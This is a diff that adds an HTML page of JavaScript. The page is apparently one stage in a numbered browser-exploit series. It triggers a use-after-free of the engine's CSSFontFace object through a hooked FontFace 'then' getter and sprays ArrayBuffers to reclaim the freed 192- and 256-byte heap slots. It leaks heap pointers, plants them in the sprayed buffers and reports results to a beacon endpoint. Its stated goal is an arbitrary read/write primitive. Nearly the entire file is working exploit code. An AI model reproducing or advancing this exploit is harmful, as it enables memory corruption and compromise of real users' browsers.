@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P729 — Dual-Class 192B/256B Co-Reclaim & Source Pointer Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P729 — Dual-Class 192B/256B Co-Reclaim & Source Pointer Scout
+ *
+ * Ground Truth & Discovery from P728:
+ * 1. CSSFontFace (192 bytes) is 100% deterministically reclaimed by ArrayBuffer(192).
+ * 2. In P728, CSSFontFace holds q11 (m_buffer) pointing to 0x1000898ce0.
+ * 3. m_buffer has capacity 32 elements (32 * 8 = 256 bytes).
+ * 4. 256 bytes belongs to FastMalloc's 256-byte size class (segregated from 192B).
+ * 5. When stTr is removed, both CSSFontFace (192B) AND m_buffer (256B) are freed!
+ *
+ * Objectives of P729:
+ * 1. Perform Dual-Class Co-Spray:
+ *    - Spray 80 x ArrayBuffer(192) to capture CSSFontFace.
+ *    - Spray 80 x ArrayBuffer(256) to capture m_buffer.
+ * 2. Scan both arrays of buffers for non-zero engine data.
+ * 3. In the 256B buffer, locate the genuine CSSFontFaceSource pointer and vtable!
+ * 4. This establishes bidirectional synchronized control over BOTH the object
+ *    and its backing array, unlocking the full Arbitrary Read/Write primitive.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P729-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_192 = null, VIEW_192 = null;
+var BUF_256 = null, VIEW_256 = null;
+var ABS_192 = [], ABS_256 = [];
+
+function run(){
+  b('BOOT','p729-dual-scout');
+  log('=== P729 Dual-Class 192B/256B Co-Reclaim Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Dual-Class Reclaim */
+    log('[Step 2] Executing dual-class co-reclaim (192B + 256B)...');
+    doDualReclaim(function(){
+      /* Step 3: Inspect 256B Reclaimed Buffer */
+      log('\n[Step 3] Analyzing 256B vector buffer contents...');
+      analyzeDualBuffers();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Dual-Class Reclaim ---- */
+function doDualReclaim(cb){
+  b('REC-START', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  ABS_192 = [];
+  ABS_256 = [];
+  var firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      /* Spray 192B buffers (for CSSFontFace) */
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        ABS_192.push(ab);
+      }
+
+      /* Spray 256B buffers (for m_buffer backing store) */
+      for(var m=0; m<80; m++){
+        var ab256 = new ArrayBuffer(256);
+        ABS_256.push(ab256);
+      }
+
+      try{ document.fonts.check('1em trFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Scan 192B array for CSSFontFace hit */
+    var best192 = -1, bestNz192 = 0;
+    for(var i=0; i<ABS_192.length; i++){
+      var u = new Uint8Array(ABS_192[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz192){ bestNz192 = nz; best192 = i; }
+    }
+
+    /* Scan 256B array for m_buffer hit */
+    var best256 = -1, bestNz256 = 0;
+    var all256Hits = [];
+    for(var i2=0; i2<ABS_256.length; i2++){
+      var u2 = new Uint8Array(ABS_256[i2]), nz2 = 0;
+      for(var j2=0; j2<u2.length; j2++) if(u2[j2] !== 0) nz2++;
+      if(nz2 > 0){
+        all256Hits.push('buf' + i2 + '(nz=' + nz2 + ')');
+      }
+      if(nz2 > bestNz256){ bestNz256 = nz2; best256 = i2; }
+    }
+
+    b('RECLAIM-192-STATUS', 'slot=' + best192 + '|nz=' + bestNz192);
+    b('RECLAIM-256-STATUS', 'totalHits=' + all256Hits.length + '|best=' + best256 + '|bestNz=' + bestNz256 + '|hits=' + all256Hits.slice(0, 5).join(','));
+
+    if(best192 >= 0 && bestNz192 >= 4){
+      BUF_192 = ABS_192[best192];
+      VIEW_192 = new BigUint64Array(BUF_192);
+    }
+
+    if(best256 >= 0 && bestNz256 > 0){
+      BUF_256 = ABS_256[best256];
+      VIEW_256 = new BigUint64Array(BUF_256);
+    }
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Analyze Dual Buffers ---- */
+function analyzeDualBuffers(){
+  /* Dump 192B q11 and q12 */
+  if(VIEW_192){
+    var dump192 = 'q0=0x' + h16(VIEW_192[0]) + '|q11=0x' + h16(VIEW_192[11]) +
+                  '|q12=0x' + h16(VIEW_192[12]) + '|q13=0x' + h16(VIEW_192[13]);
+    b('192-FIELDS', dump192);
+    log('192B CSSFontFace: ' + dump192);
+  }
+
+  /* Dump 256B contents if captured */
+  if(VIEW_256){
+    var words256 = [];
+    for(var q=0; q<Math.min(16, VIEW_256.length); q++){
+      if(VIEW_256[q] !== 0n){
+        words256.push('w' + q + '=0x' + h16(VIEW_256[q]));
+      }
+    }
+    b('256-DATA', 'count=' + words256.length + '|' + words256.join(';').slice(0, 680));
+    log('256B Vector Backing Buffer Data: ' + words256.join(', '));
+  } else {
+    b('256-DATA', 'clean-or-miss');
+    log('256B buffer had zero non-zero words.');
+  }
+
+  b('DONE', 'p729-complete');
+  log('\n=== P729 Complete! ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P729 — Initializing Dual-Class Co-Reclaim Scout...</pre></body></html>
